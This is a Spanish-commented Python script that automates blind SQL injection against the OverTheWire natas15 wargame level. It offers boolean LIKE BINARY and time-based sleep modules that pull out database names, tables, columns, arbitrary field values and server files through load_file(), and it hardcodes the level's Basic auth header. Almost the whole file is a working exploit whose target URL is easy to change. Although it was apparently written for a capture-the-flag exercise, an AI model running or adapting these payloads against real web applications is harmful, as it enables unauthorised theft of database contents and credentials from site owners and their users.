#!/usr/bin/python3

import requests, time, sys, os, signal
import urllib3
urllib3.disable_warnings()

#Funciones

def like_binary(result):
	r = ""
	print("""
1. Base de datos
2. Tablas
3. Columnas
4. Archivo
5. Otro
""")
	while r != "1" and r != "2" and r != "3" and r != "4" and r != "5":
		r = input("[*] ¿Que dato desea obtener?: ")
		if r != "1" and r != "2" and r != "3" and r != "4" and r != "5":
			print("[X] Por favor introduzca 1, 2, 3, 4 o 5")
		if r == "4":
			archivo = input("\n[+] Ingrese la ruta (Ej: /etc/natas_webpass/natas16): ")
		if r == "5":
			tabla = input("\n[+] Ingrese la tabla (Ej: users): ")
			campo = input("\n[+] Ingrese el campo (Ej: username): ")
	palabra = input("\n[+] Ingrese una palabra que no deberia estar en la respuesta del servidor: ")
	while True:
		x = 0
		for letra in abc:
			if result != "":
				letra = result+letra
			print("----- [..] Probando: "+letra)
			if r == "1":
				payload = f""" " or database() like binary "{letra}%" -- -"""
			if r == "2":
				payload = f""" " or (select table_name from information_schema.tables where table_schema=database() limit 1) like binary "{letra}%" -- -"""
			if r == "3":
				payload = f""" " or (select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1) like binary "{letra}%" -- -"""
			if r == "4":
				payload = f""" " or (select load_file('{archivo}') limit 1) like binary "{letra}%" -- -"""
			if r == "5":
				payload = f""" " or (select {campo} from {tabla} where username = 'alice' limit 1) like binary "{letra}%" -- -"""
			datos = { 'username' : payload}
			print(datos)
			response = requests.post(url, data=datos, headers=headers, verify=False)
			if response.status_code != 200:
				print("[-] EL SERVIDOR DEVUELVE UNA RESPUESTA DIFERENTE A 200")
				sys.exit(0)
			#print(response.text)
			if palabra not in response.text:
				result = letra
				os.system('cls' if os.name == 'nt' else 'clear')
				print(" ----------- "+result+" ----------- ")
				x = 1
				break

			if list(letra).pop() == list(abc).pop():
				os.system('cls' if os.name == 'nt' else 'clear')
				if result != "":
					print("\n[+] Resultado: "+result)
				print("\n[-] NO SE ENCONTRARON MAS COINCIDENCIAS CON ESTA LISTA DE LETRAS")
				sys.exit(0)
	
	print(f"Resultado: {result}")

def time_based(result):
	r = ""
	print("""
1. Base de datos
2. Tablas
3. Columnas
4. Archivo
5. Otro
""")
	while r != "1" and r != "2" and r != "3" and r != "4" and r != "5":
		r = input("[*] ¿Que dato desea obtener?: ")
		if r != "1" and r != "2" and r != "3" and r != "4" and r != "5":
			print("[X] Por favor introduzca 1, 2, 3, 4 o 5")
		if r == "4":
			archivo = input("\n[+] Ingrese la ruta (Ej: /etc/natas_webpass/natas16): ")
		if r == "5":
			tabla = input("\n[+] Ingrese la tabla (Ej: users): ")
			campo = input("\n[+] Ingrese el campo (Ej: username): ")
	for i in range(1,16):
		print("\n---------------- [+] Letra nro:" + str(i) + "--------------------")
		for letra in abc:
			print("----- [..] Probando: "+letra)
			if r == "1":
				payload = f""" " or if(substr(database(),{i},1)='{letra}',sleep(3),1) -- -"""
			if r == "2":
				payload = f""" " or if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
			if r == "3":
				payload = f""" " or if(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1),{i},1)={letra},sleep(3),1) -- -"""
			if r == "4":
				payload = f""" " or if(substr((select load_file('{archivo}') limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
			if r == "5":
				payload = f""" " or if(substr((select {campo} from {tabla} where username = 'alice' limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
			datos = { 'username' : payload}
			print(datos)
			time_old = time.time()
			response = requests.post(url, data=datos, headers=headers, verify=False)
			if response.status_code != 200:
				print("[-] EL SERVIDOR DEVUELVE UNA RESPUESTA DIFERENTE A 200")
				sys.exit(0)
			#print(response.text)
			time_new = time.time()
			seconds = time_new - time_old
			if seconds > 3:
				result += letra
				os.system('cls' if os.name == 'nt' else 'clear')
				print(" ----------- "+result+" ----------- ")
				break

			if letra == list(abc).pop():
				os.system('cls' if os.name == 'nt' else 'clear')
				if result != "":
					print("\n[+] Resultado: "+result)
				print("\n[-] NO SE ENCONTRARON MAS COINCIDENCIAS CON ESTA LISTA DE LETRAS")
				sys.exit(0)	
	print(f"Resultado: {result}")					


#Salida rapida
def ctrl_c(sig,frame):
	print("\n\n[*] Cerrando el programa...\n")
	sys.exit(1)
signal.signal(signal.SIGINT, ctrl_c)

if __name__ == '__main__':
	#Datos
	result = ''
	abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ0123456789' #--> Seleccione su lista de letras
	url = 'http://natas15.natas.labs.overthewire.org/index.php' # --> Seleccione su url
	headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="} # --> Header de autenticación	
	print("""

                                                                                    
,--.   ,--.          ,---.   ,-----.   ,--.    ,-----.                     ,--.     
|   `.'   |,--. ,--.'   .-' '  .-.  '  |  |   '  .--./,--.--. ,--,--. ,---.|  |,-.  
|  |'.'|  | \  '  / `.  `-. |  | |  |  |  |   |  |    |  .--'' ,-.  || .--'|     /  
|  |   |  |  \   '  .-'    |'  '-'  '-.|  '--.'  '--'\|  |   \ '-'  |\ `--.|  \  \  
`--'   `--'.-'  /   `-----'  `-----'--'`-----' `-----'`--'    `--`--' `---'`--'`--' 
           `---'                                                                    
	
	""")
	print("[+] Bienvenido usuario!")
	print("\n[+] Tenemos los siguientes modulos:")
	print("""
1. Like Binary
2. Time Based""")
	modulo = ""
	while modulo != "1" and modulo != "2":
		modulo = input("\n[*] ¿Que modulo desea usar?: ")
		if modulo != "1" and modulo != "2":
			print("[X] Por favor introduzca un modulo correcto: 1 o 2")
	if modulo == "1":
		like_binary(result)
	if modulo == "2":
		time_based(result)	

#Nombre base de datos: payload = f"""' or if(substr(database(),{i},1)='{letra}',sleep(3),1) -- -"""
#Nombre tablas: payload = f"""' or if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
#Nombre columnas: payload = f"""' or if(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1),{i},1)={letra},sleep(3),1) -- -"""
